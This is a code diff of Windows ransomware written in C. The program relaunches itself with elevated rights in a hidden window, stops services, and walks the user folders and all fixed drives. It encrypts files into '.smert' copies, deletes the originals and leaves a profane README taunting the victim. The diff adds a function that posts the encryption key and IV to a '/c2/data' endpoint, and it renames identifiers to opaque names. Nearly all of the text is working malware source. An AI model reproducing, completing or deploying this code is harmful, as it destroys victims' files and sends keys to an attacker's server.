@@ -11,34 +11,35 @@
 #include <tchar.h>
 #include <bcrypt.h>
 #include <threadpoolapiset.h>
+#include <wininet.h>
 
 #define BUF_SIZE 65536
 
 typedef struct {
-    char* p1;
-    unsigned char p2[32];
-    unsigned char p3[16];
-} CustomStruct;
+    char* x1;
+    unsigned char x2[32];
+    unsigned char x3[16];
+} XStruct;
 
-void func1(const char* p4, const unsigned char* p2, const unsigned char* p3);
-void func2(const char* p5, const unsigned char* p2, const unsigned char* p3, int p6);
-int func3();
-void func4();
-void func5(unsigned char* p7, size_t p8);
-void func6(unsigned char* p2, unsigned char* p3);
-void func7(unsigned char* p2, unsigned char* p3);
+void y1(const char* x4, const unsigned char* x2, const unsigned char* x3);
+void y2(const char* x5, const unsigned char* x2, const unsigned char* x3, int x6);
+int y3();
+void y4();
+void y5(unsigned char* x7, size_t x8);
+void y6(unsigned char* x2, unsigned char* x3);
+void y7(unsigned char* x2, unsigned char* x3);
 
 TP_CALLBACK_ENVIRON tpoolEnv;
 PTP_POOL tpool;
 PTP_CLEANUP_GROUP tpoolCleanupGroup;
 
 void CALLBACK tpoolCallback(PTP_CALLBACK_INSTANCE instance, PVOID context, PTP_WORK work) {
-    CustomStruct* p9 = (CustomStruct*)context;
-    func1(p9->p1, p9->p2, p9->p3);
-    SecureZeroMemory(p9->p1, strlen(p9->p1));
-    free(p9->p1);
-    SecureZeroMemory(p9, sizeof(CustomStruct));
-    free(p9);
+    XStruct* x9 = (XStruct*)context;
+    y1(x9->x1, x9->x2, x9->x3);
+    SecureZeroMemory(x9->x1, strlen(x9->x1));
+    free(x9->x1);
+    SecureZeroMemory(x9, sizeof(XStruct));
+    free(x9);
 }
 
 void initThreadPool() {
@@ -86,7 +87,7 @@ void elevatePrivileges() {
             SHELLEXECUTEINFO sei = { sizeof(sei) };
             sei.lpVerb = _T("runas");
             sei.lpFile = szPath;
-            sei.lpParameters = _T("--food");
+            sei.lpParameters = _T("--foodsum");
             sei.hwnd = NULL;
             sei.nShow = SW_HIDE;
 
@@ -116,18 +117,18 @@ void stopServices() {
     }
 }
 
-void func1(const char* p4, const unsigned char* p2, const unsigned char* p3) {
+void y1(const char* x4, const unsigned char* x2, const unsigned char* x3) {
     char modPath[MAX_PATH];
     GetModuleFileName(NULL, modPath, MAX_PATH);
-    if (strstr(p4, ".exe") || _stricmp(p4, modPath) == 0) {
+    if (strstr(x4, ".exe") || _stricmp(x4, modPath) == 0) {
         return;
     }
 
-    FILE* inFile = fopen(p4, "rb");
+    FILE* inFile = fopen(x4, "rb");
     if (!inFile) return;
 
     char outFilePath[256];
-    snprintf(outFilePath, sizeof(outFilePath), "%s.smert", p4);
+    snprintf(outFilePath, sizeof(outFilePath), "%s.smert", x4);
 
     FILE* outFile = fopen(outFilePath, "wb");
     if (!outFile) {
@@ -152,7 +153,7 @@ void func1(const char* p4, const unsigned char* p2, const unsigned char* p3) {
         return;
     }
 
-    if (!CryptHashData(hHash, p2, 32, 0)) {
+    if (!CryptHashData(hHash, x2, 32, 0)) {
         CryptDestroyHash(hHash);
         CryptReleaseContext(hProv, 0);
         fclose(inFile);
@@ -170,7 +171,7 @@ void func1(const char* p4, const unsigned char* p2, const unsigned char* p3) {
 
     CryptDestroyHash(hHash);
 
-    if (!CryptSetKeyParam(hKey, KP_IV, p3, 0)) {
+    if (!CryptSetKeyParam(hKey, KP_IV, x3, 0)) {
         CryptDestroyKey(hKey);
         CryptReleaseContext(hProv, 0);
         fclose(inFile);
@@ -200,31 +201,31 @@ void func1(const char* p4, const unsigned char* p2, const unsigned char* p3) {
     fclose(inFile);
     fclose(outFile);
 
-    remove(p4);
+    remove(x4);
 }
 
-int readmeExists(const char* p5) {
+int readmeExists(const char* x5) {
     char rPath[256];
-    snprintf(rPath, sizeof(rPath), "%s\\README.txt", p5);
+    snprintf(rPath, sizeof(rPath), "%s\\README.txt", x5);
     struct stat buffer;
     return (stat(rPath, &buffer) == 0);
 }
 
-void createReadme(const char* p5) {
-    if (readmeExists(p5)) {
+void createReadme(const char* x5) {
+    if (readmeExists(x5)) {
         return;
     }
     char rPath[256];
-    snprintf(rPath, sizeof(rPath), "%s\\README.txt", p5);
+    snprintf(rPath, sizeof(rPath), "%s\\README.txt", x5);
 
     FILE* readme = fopen(rPath, "w");
     if (readme) {
-        fprintf(readme, "Hello.\n Well, you got fucked. more specifically your files are.\nThere's no way to recover the files cuz im not gonna be a retard and demand shit.\n");
+        fprintf(readme, "Your files have been fucked, theres no way back.\nWhat can you do about it?\n Start all over again.");
         fclose(readme);
     }
 }
 
-int checkSystemDir(const char* p5) {
+int checkSystemDir(const char* x5) {
     const char* sysDirs[] = {
         "C:\\Windows",
         "C:\\Users\\Default",
@@ -233,7 +234,7 @@ int checkSystemDir(const char* p5) {
     };
 
     for (int i = 0; sysDirs[i] != NULL; i++) {
-        if (_stricmp(p5, sysDirs[i]) == 0) {
+        if (_stricmp(x5, sysDirs[i]) == 0) {
             return 1;
         }
     }
@@ -281,17 +282,17 @@ int checkMemory() {
     return 1;
 }
 
-void func2(const char* p5, const unsigned char* p2, const unsigned char* p3, int p6) {
+void y2(const char* x5, const unsigned char* x2, const unsigned char* x3, int x6) {
     WIN32_FIND_DATA findData;
     HANDLE hFind;
     char searchPath[512];
     char fullPath[512];
 
-    if (checkSystemDir(p5)) {
+    if (checkSystemDir(x5)) {
         return;
     }
 
-    snprintf(searchPath, sizeof(searchPath), "%s\\*", p5);
+    snprintf(searchPath, sizeof(searchPath), "%s\\*", x5);
     hFind = FindFirstFile(searchPath, &findData);
 
     if (hFind == INVALID_HANDLE_VALUE) {
@@ -300,33 +301,33 @@ void func2(const char* p5, const unsigned char* p2, const unsigned char* p3, int
 
     do {
         if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
-            snprintf(fullPath, sizeof(fullPath), "%s\\%s", p5, findData.cFileName);
+            snprintf(fullPath, sizeof(fullPath), "%s\\%s", x5, findData.cFileName);
 
             if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-                if (p6 < 3) {
-                    func2(fullPath, p2, p3, p6 + 1);
+                if (x6 < 3) {
+                    y2(fullPath, x2, x3, x6 + 1);
                 }
             }
             else {
                 const char* fileExtension = strrchr(findData.cFileName, '.');
-                if (!readmeExists(p5) && (fileExtension == NULL || _stricmp(fileExtension, ".lnk") != 0)) {
-                    createReadme(p5);
+                if (!readmeExists(x5) && (fileExtension == NULL || _stricmp(fileExtension, ".lnk") != 0)) {
+                    createReadme(x5);
                 }
 
-                CustomStruct* p9 = (CustomStruct*)malloc(sizeof(CustomStruct));
-                p9->p1 = _strdup(fullPath);
-                memcpy(p9->p2, p2, 32);
-                memcpy(p9->p3, p3, 16);
+                XStruct* x9 = (XStruct*)malloc(sizeof(XStruct));
+                x9->x1 = _strdup(fullPath);
+                memcpy(x9->x2, x2, 32);
+                memcpy(x9->x3, x3, 16);
 
-                PTP_WORK work = CreateThreadpoolWork(tpoolCallback, p9, &tpoolEnv);
+                PTP_WORK work = CreateThreadpoolWork(tpoolCallback, x9, &tpoolEnv);
                 if (work) {
                     SubmitThreadpoolWork(work);
                 }
                 else {
-                    SecureZeroMemory(p9->p1, strlen(p9->p1));
-                    free(p9->p1);
-                    SecureZeroMemory(p9, sizeof(CustomStruct));
-                    free(p9);
+                    SecureZeroMemory(x9->x1, strlen(x9->x1));
+                    free(x9->x1);
+                    SecureZeroMemory(x9, sizeof(XStruct));
+                    free(x9);
                 }
             }
         }
@@ -335,7 +336,7 @@ void func2(const char* p5, const unsigned char* p2, const unsigned char* p3, int
     FindClose(hFind);
 }
 
-void processFiles(const unsigned char* p2, const unsigned char* p3, int p6) {
+void processFiles(const unsigned char* x2, const unsigned char* x3, int x6) {
     KNOWNFOLDERID folders[] = { FOLDERID_Documents, FOLDERID_Desktop, FOLDERID_Pictures, FOLDERID_Downloads, FOLDERID_Music, FOLDERID_Videos, FOLDERID_Contacts, FOLDERID_Favorites, FOLDERID_Links, FOLDERID_SavedGames, GUID_NULL };
     PWSTR folderPath;
 
@@ -343,7 +344,7 @@ void processFiles(const unsigned char* p2, const unsigned char* p3, int p6) {
         if (SHGetKnownFolderPath(&folders[i], 0, NULL, &folderPath) == S_OK) {
             char dirPath[MAX_PATH];
             wcstombs(dirPath, folderPath, MAX_PATH);
-            func2(dirPath, p2, p3, p6);
+            y2(dirPath, x2, x3, x6);
             CoTaskMemFree(folderPath);
         }
     }
@@ -351,57 +352,105 @@ void processFiles(const unsigned char* p2, const unsigned char* p3, int p6) {
     for (char drive = 'A'; drive <= 'Z'; drive++) {
         char rootPath[4] = { drive, ':', '\\', '\0' };
         if (GetDriveType(rootPath) == DRIVE_FIXED) {
-            func2(rootPath, p2, p3, p6);
+            y2(rootPath, x2, x3, x6);
         }
     }
 }
 
-void xorEncrypt(unsigned char* p7, size_t p8) {
-    for (size_t i = 0; i < p8; i++) {
-        p7[i] ^= 0xAA;
+void xorEncrypt(unsigned char* x7, size_t x8) {
+    for (size_t i = 0; i < x8; i++) {
+        x7[i] ^= 0xAA;
     }
 }
 
-void generateKeys(unsigned char* p2, unsigned char* p3) {
+void sendKeys(const unsigned char* key, const unsigned char* iv) {
+    HINTERNET hSession = InternetOpen("TLD12Browser/10.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hSession) return;
+
+    HINTERNET hConnect = InternetConnect(hSession, "example.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    if (!hConnect) {
+        InternetCloseHandle(hSession);
+        return;
+    }
+
+    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/c2/data", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
+    if (!hRequest) {
+        InternetCloseHandle(hConnect);
+        InternetCloseHandle(hSession);
+        return;
+    }
+
+    char keyHex[65], ivHex[33];
+    for (int i = 0; i < 32; ++i) {
+        sprintf(&keyHex[i * 2], "%02x", key[i]);
+    }
+    keyHex[64] = '\0';
+
+    for (int i = 0; i < 16; ++i) {
+        sprintf(&ivHex[i * 2], "%02x", iv[i]);
+    }
+    ivHex[32] = '\0';
+
+    char jsonData[256];
+    snprintf(jsonData, sizeof(jsonData), "{\"key\":\"%s\",\"iv\":\"%s\"}", keyHex, ivHex);
+
+    const char* headers = "Content-Type: application/json";
+    int retries = 3;
+    while (retries--) {
+        if (HttpSendRequest(hRequest, headers, (DWORD)strlen(headers), (LPVOID)jsonData, (DWORD)strlen(jsonData))) {
+            break;
+        }
+        Sleep(1000);
+    }
+
+    InternetCloseHandle(hRequest);
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hSession);
+}
+
+
+void generateKeys(unsigned char* x2, unsigned char* x3) {
     HCRYPTPROV hProv;
     if (CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
-        CryptGenRandom(hProv, 32, p2);
-        CryptGenRandom(hProv, 16, p3);
+        CryptGenRandom(hProv, 32, x2);
+        CryptGenRandom(hProv, 16, x3);
         CryptReleaseContext(hProv, 0);
 
-        xorEncrypt(p2, 32);
-        xorEncrypt(p3, 16);
+        xorEncrypt(x2, 32);
+        xorEncrypt(x3, 16);
+
+        sendKeys(x2, x3);
     }
     else {
         exit(1);
     }
 }
 
-void decryptKeys(unsigned char* p2, unsigned char* p3) {
-    xorEncrypt(p2, 32);
-    xorEncrypt(p3, 16);
+void decryptKeys(unsigned char* x2, unsigned char* x3) {
+    xorEncrypt(x2, 32);
+    xorEncrypt(x3, 16);
 }
 
 int main(int argc, char* argv[]) {
     if (argc < 2) {
         elevatePrivileges();
-        ShellExecute(NULL, "open", argv[0], "--food", NULL, SW_HIDE);
+        ShellExecute(NULL, "open", argv[0], "--foodsum", NULL, SW_HIDE);
         return 0;
     }
 
-    unsigned char p2[32];
-    unsigned char p3[16];
+    unsigned char x2[32];
+    unsigned char x3[16];
 
-    generateKeys(p2, p3);
+    generateKeys(x2, x3);
 
     stopServices();
 
-    decryptKeys(p2, p3);
+    decryptKeys(x2, x3);
 
     initThreadPool();
 
-    if (strcmp(argv[1], "--food") == 0) {
-        processFiles(p2, p3, 0);
+    if (strcmp(argv[1], "--foodsum") == 0) {
+        processFiles(x2, x3, 0);
     }
     else {
         return 1;
